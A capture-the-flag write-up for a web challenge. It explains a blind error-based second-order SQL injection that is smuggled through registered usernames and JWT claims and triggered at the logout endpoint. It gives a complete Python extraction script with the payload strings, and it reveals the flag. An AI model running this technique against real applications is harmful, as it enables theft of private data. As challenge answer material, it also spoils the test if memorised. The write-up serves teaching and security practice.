## Game Boy Advance

### Description

Thank you for your help!
We fixed it, and also stopped using a Redis database for handling tokens, SQL is more reliable.
Can you have a look, just to check that everything is secure now?

**Authors : algorab & Sto**

### Solution

Given the fact that we are told that the application now uses SQL to handle tokens, it seems that this is a good lead to investigate.
Considering the source code of the first version of the API, the application should then now use a SQL database for checking if tokens are expired, and for the `/logout` and the `/refresh` endpoints.
Another key information to notice is that the username is included in the JWT claims. This means that it could be used during the interactions with the database!

We can try to register with usernames that could trigger and error when used in an SQL query. In fact, the username `'` triggers an error when we try to logout. So we have our injection vector, and we can perform a blind error-based second order SQL injection!

It is possible to automate the process with a script:

```python
import requests
import string
import random

url = "http://localhost/api"

def create_user(username, mail="joe@dohn.net", password="password"):
    endpoint = "/register"
    r = requests.post(url+endpoint, json={"username": username, "mail": mail, "password": password})

def login(username, password="password"):
    endpoint = "/login"
    r = requests.post(url+endpoint, json={"username": username, "password": password})
    return r.json()

def logout(access_token):
    endpoint = "/logout"
    r = requests.get(url+endpoint, headers={"X-Access-Token": access_token})
    return r.status_code

alphabet = string.ascii_letters+string.digits+"_-.@$/{} "

payload_len = "' or if((select length(content) from posts where posts.is_private=1)={}, cast((select 'a') as int), 0) -- "

for i in range(1000):
    p = payload_len.format(str(i))
    username = random.randbytes(4).hex()+p
    create_user(username)
    access_token = login(username)["access_token"]
    if logout(access_token) == 500:
        length = i
        break

print(f"Found length: {length}")

payload = "' or if((select binary substring(content,{},1) from posts where is_private=1 limit 0,1)={}, cast((select 'a') as int), null) -- "
flag = ""

while len(flag) != length:
    for char in alphabet:
        p = payload.format(str(len(flag)+1),hex(ord(char)))
        username = random.randbytes(4).hex()+p
        create_user(username)
        access_token = login(username)["access_token"]
        if logout(access_token) == 500:
            flag += char

print(f"Flag: {flag}")
```

Regarding the structure of the database, we can assume that it is the same as for the first challenge, even if it could be possible to enumerate the tables and columns names quite easily following the same logic as for recovering the flag. 

After running the script, we can recover the flag.

### Flag

`N0PS{sQl_1nJ3c710n_1n_Jw7_cL41m5}`